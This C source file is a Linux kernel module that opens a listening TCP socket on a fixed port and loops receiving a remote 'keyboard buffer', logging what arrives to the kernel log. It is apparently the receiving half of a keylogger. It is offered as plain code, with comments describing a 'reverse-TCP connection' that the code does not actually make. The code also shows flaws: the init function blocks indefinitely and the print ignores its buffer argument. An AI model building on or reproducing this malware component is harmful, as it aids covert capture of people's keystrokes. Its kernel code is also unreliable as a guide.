#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/syscalls.h>

#include <asm/uaccess.h>
#include <asm/segment.h>

#include <linux/netdevice.h>
#include <linux/socket.h>
#include <linux/tcp.h>
#include <linux/net.h>
#include <linux/ip.h>
#include <linux/in.h>

#define KEYBOARD_BUFFER_SIZE 1024

#define CONNECTED    1
#define DISCONNECTED 0

int connection_state;

char keyboard_buffer[KEYBOARD_BUFFER_SIZE];

struct sockaddr_in sock_in;
struct socket     *serv_sock;
struct socket     *acc_sock ;

mm_segment_t old_fs;


void reverse_connect(void)
{
	// Instantiate a socket for communication.
	if (sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &serv_sock) < 0)
		printk("Could not create socket.\n");
	else
		printk("Socket created.\n");

	// Set properties for socket input.
	sock_in.sin_addr.s_addr = INADDR_ANY;
	sock_in.sin_family = AF_INET;
	sock_in.sin_port   = htons((unsigned short) 0x395D);

	// Bind socket with the properties denoted above.
	if (serv_sock->ops->bind(serv_sock, (struct sockaddr*)&sock_in, sizeof(sock_in)) < 0)
		printk("Error binding socket.\n");
	else
		printk("Socket bound.\n");

	// Listen on the socket for incoming connections.
	if (serv_sock->ops->listen(serv_sock, 32) != 0)
		printk("Error listening on socket.\n");
	else
		printk("Listening on socket.\n");

	// Create another socket for connection handling.
	if (sock_create(PF_INET, SOCK_STREAM, IPPROTO_TCP, &acc_sock) < 0)
		printk("Could not create socket.\n");
	else
		printk("Socket created.\n"); 

	// Clone the previously instantiated socket.
	acc_sock->type = serv_sock->type;
	acc_sock->ops  = serv_sock->ops;

	// Accept connections on the above IP / port combination.
	if (acc_sock->ops->accept(serv_sock, acc_sock, 0) < 0)
		printk("Could not accept the socket connection.\n");
	else
	{
		printk("Socket connection accepted.\n");
		connection_state = CONNECTED;
	}
}


void recv_buffer(struct socket *sock, const char *buffer, size_t length)
{
	struct msghdr msg;
	struct iovec  iov;

	msg.msg_control = NULL;
	msg.msg_controllen = 0;
	msg.msg_namelen = 0;
	msg.msg_iovlen  = 1;
	msg.msg_flags   = 0;
	msg.msg_iov  = &iov;
	msg.msg_name = 0;

	iov.iov_base = (void *) &buffer[0];
	iov.iov_len  = (size_t) length; 

	old_fs = get_fs();
	set_fs(KERNEL_DS);
		length = sock_recvmsg(sock, &msg, length, MSG_WAITALL);
	set_fs(old_fs);

	printk("Buffer Received:  %s\n", keyboard_buffer);
}


int start(void)
{
	// Attempt to handle the reverse-TCP connection.
	reverse_connect();

	// Receive keyboard buffer from r-TCP connection.
	while (connection_state)
		recv_buffer(acc_sock, keyboard_buffer, KEYBOARD_BUFFER_SIZE);

	return 0;
}

void stop(void)
{
	if (serv_sock->ops->shutdown(serv_sock, 2) < 0)
		printk("Could not close the socket.\n");
	else
	{
		connection_state = DISCONNECTED;
		printk("Closed the socket.\n");
	}

	if (acc_sock->ops->shutdown(acc_sock, 2) < 0)
		printk("Could not close the socket.\n");
	else
	{
		connection_state = DISCONNECTED;
		printk("Closed the socket.\n");
	}
}

module_init(start);
module_exit(stop) ;

MODULE_LICENSE("GPL");